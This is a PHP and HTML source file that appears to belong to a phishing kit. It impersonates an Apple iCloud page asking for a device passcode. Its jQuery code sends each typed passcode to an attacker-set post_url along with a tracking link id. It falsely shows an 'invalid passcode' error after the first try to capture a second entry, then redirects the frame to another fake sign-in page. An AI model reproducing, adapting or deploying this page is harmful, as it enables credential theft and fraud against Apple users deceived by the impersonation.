<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/apple.php");

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
?>
<!DOCTYPE html>
<html dir="ltr" data-rtl="false" lang="en" class="prefpane na-presentation">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--
	<link href="https://db.onlinewebfonts.com/c/09f79b480eabca839b233bdde61980ac?family=SF+Pro+Icons+Regular" rel="stylesheet" type="text/css"/>
	-->
    <link rel="stylesheet" href="script/icloud2024/css/home-206028b35c1e109c240a.css">
    <link rel="stylesheet" type="text/css" media="screen" href="script/icloud2024/css/app-sk7.css">
    <style type="text/css">
	
	@keyframes opacity-60-25-0-12{
		0% {
			opacity: 0.25;
		}
		0.01% {
			opacity: 0.25;
		}
		0.02% {
			opacity: 1;
		}
		60.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	
	@keyframes opacity-60-25-1-12{
		0% {
			opacity: 0.25;
		}
		8.34333% {
			opacity: 0.25;
		}
		8.35333% {
			opacity: 1;
		}
		68.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-2-12{
		0% {
			opacity: 0.25;
		}
		16.6767% {
			opacity: 0.25;
		}
		16.6867% {
			opacity: 1;
		}
		76.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-3-12{
		0% {
			opacity: 0.25;
		}
		25.01% {
			opacity: 0.25;
		}
		25.02% {
			opacity: 1;
		}
		85.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-4-12{
		0% {
			opacity: 0.25;
		}
		33.3433% {
			opacity: 0.25;
		}
		33.3533% {
			opacity: 1;
		}
		93.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-5-12{
		0% {
			opacity: 0.270958;
		}
		41.6767% {
			opacity: 0.25;
		}
		41.6867% {
			opacity: 1;
		}
		1.67667% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.270958;
		}
	}
	@keyframes opacity-60-25-6-12{
		0% {
			opacity: 0.375125;
		}
		50.01% {
			opacity: 0.25;
		}
		50.02% {
			opacity: 1;
		}
		10.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.375125;
		}
	}
	@keyframes opacity-60-25-7-12{
		0% {
			opacity: 0.479292;
		}
		58.3433% {
			opacity: 0.25;
		}
		58.3533% {
			opacity: 1;
		}
		18.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.479292;
		}
	}
	@keyframes opacity-60-25-8-12{
		0% {
			opacity: 0.583458;
		}
		66.6767% {
			opacity: 0.25;
		}
		66.6867% {
			opacity: 1;
		}
		26.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.583458;
		}
	}
	@keyframes opacity-60-25-9-12{
		0% {
			opacity: 0.687625;
		}
		75.01% {
			opacity: 0.25;
		}
		75.02% {
			opacity: 1;
		}
		35.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.687625;
		}
	}
	@keyframes opacity-60-25-10-12{
		0% {
			opacity: 0.791792;
		}
		83.3433% {
			opacity: 0.25;
		}
		83.3533% {
			opacity: 1;
		}
		43.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.791792;
		}
	}
	@keyframes opacity-60-25-11-12{
		0% {
			opacity: 0.895958;
		}
		91.6767% {
			opacity: 0.25;
		}
		91.6867% {
			opacity: 1;
		}
		51.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.895958;
		}
	}
	
	
	</style>
  </head>
  <body class="tk-body ">
    <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
    <div aria-hidden="true" style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
    <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
      <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
        <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
		  
          <div id="step" class="si-step  ">
		  
            <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section">
				<div class="logo   signin-label  fade-in ">
					<img class="cnsmr-app-image " src="script/icloud2024/img/icloud.svg" srcset="" alt="Logotipo de la aplicaci贸n" style="width: 100px;">
				</div>
			</logo>
			
            <div id="stepEl" class="   " style="margin-top: 20px;">
			  
				<div class="sa-sk7__app-title" style="margin-bottom: 20px;">
				  <h1 class=" tk-intro  " tabindex="-1">
						<?=$language['enter_pass_location'][$lang];?>
				  </h1>
				</div>
				
				
              <sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">
                <div class="signin fade-in" id="signin">
                  <div class="  swp-enable  container si-field-container  password-second-step     " >
                    
					<div id="sign_in_form" class="signin-form swp eyebrow fed-auth hide-password">
                      <div class="">
                        <div class="">
						
                          <div class="account-name form-row    ">
                            <label class="sr-only form-cell form-label" for="password_text_field"><?=$language['signin_label'][$lang];?></label>
                            <div class="form-cell">
                              <div class=" form-cell-wrapper form-textbox   ">
                                <input type="password" id="password_text_field" can-field="accountName" autocorrect="off" autocapitalize="off" aria-required="true" required="required" spellcheck="false" ($focus)="appleIdFocusHandler()" ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox-input " autocomplete="off" aria-invalid="false">
                                <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout"> <?=$language['enter_passcode'][$lang];?> </span>
                              </div>
                            </div>
                          </div>
                 
                        </div>
                      </div>
                    </div>
					
					
					<div ($click)="errorClickHandler()" class="pop-container error signin-error swp-pop-error" style="display: none;">
						<div class="error pop-bottom tk-subbody-headline" ($click)="errorClickHandler()">
						  <p class="thin tk-subbody" id="errMsg">                            <?=$language['invalid_passcode'][$lang];?>
						  </p>
							
							 
							  
						  
						</div>
					  </div>
					
                    <div class="spinner-container auth  hide">
					  <div class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
						<div style="position: absolute;top: -1px;opacity: 0.25;animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
						<div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
						  <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(6.25px, 0px); border-radius: 1px;"></div>
						</div>
					  </div>
					</div>
					
                    <button id="sign-in" ($click)="_verify($element)" tabindex="0" class="si-button btn fed-ui   fed-ui-animation-show   disable   remember-me  " aria-label="Continue" aria-disabled="true" disabled>
                      <i class="shared-icon icon_sign_in"></i>
                      <span class="text feat-split"> Continue </span>
                    </button>
					
                    <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me   link " aria-label="Close">
                      <span class="text"> Close </span>
                    </button>
					
                  </div>

                </div>
              </sign-in>
            </div>
          </div>
          <div id="stocking" style="display:none !important;"></div>
        </div>
        <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"></idms-modal>
      </apple-auth>
    </div>
  </body>
</html>
<script src="script/icloud2024/js/jquery-3.7.1.min.js"></script>
<script>
$( document ).ready(function() {

    $('#password_text_field').on('focus',function(){
		$('#sign_in_form').addClass('has-focus');
		$('.form-row').addClass('apple-id-focus');
		$('#password_text_field').attr('data-focus-method','mouse');
	});
	
	$('#password_text_field').on('focusout',function(){
		$('#sign_in_form').removeClass('has-focus');
		$('.form-row').removeClass('apple-id-focus');
		$('#password_text_field').removeAttr('data-focus-method');
	});
	
	$('#password_text_field').on('input change keyup paste',function(){
		clearErrors();
		if($(this).val().length > 0){
			$('#sign_in_form').addClass('account-name-entered');
			$('#password_text_field').addClass('form-textbox-entered');
			$('#sign-in').removeClass('disable').attr('aria-disabled',false).removeAttr('disabled');
		}else{
			$('#sign_in_form').removeClass('account-name-entered');
			$('#password_text_field').removeClass('form-textbox-entered');
			$('#sign-in').addClass('disable').attr('aria-disabled',true).attr('disabled',true);
		}
	});
	
	$('#password_text_field, #password_text_field').on('keypress',function(e){
		if (event.which == 13) {
			if($('#sign-in').attr('aria-disabled')=='false'){
				$('#sign-in').click();
			}
		}
	});
	
	
	$('#sign-in').on('click',function(e){
		verify();
	});
	
	function clearErrors(){
		$('.swp-pop-error').hide();
		$('.form-cell-wrapper').removeClass('is-error');
		$('.si-field-container').removeClass('has-error');
	}
	
	function setload(){
		$('.spinner-container').removeClass('hide').addClass('show');
		$('#sign-in').addClass('disable').hide();
	}
	
	function verify(){
		setload();
		doLogin();
	}
	
	var max_retry = 0;
	function doLogin(){
		max_retry +=1
		var user_input = $('#password_text_field').val();

		$.ajax({
			type:"POST",
			url: post_url,
			data:'id=' + link_id + '&type=passcode&pass=' + user_input,
			dataType: "json",
			success: function(data){},
			error: function(XMLHttpRequest, textStatus, errorThrown) {},
			complete: function(XMLHttpRequest, textStatus, errorThrown) {
				if(max_retry >=2){
					var parentWindow = window.top;
					var parentElement = $(parentWindow.document).find('iframe');
					$(parentElement).attr('src','signin.php');
				}else{
					$('.spinner-container').removeClass('show').addClass('hide');
					$('.form-cell-wrapper').addClass('is-error');
					$('.si-field-container').addClass('has-error');
					$('.swp-pop-error').show();
					$('#sign-in').show();
				}
			},
		});
		
		
	}
	
	
});

</script>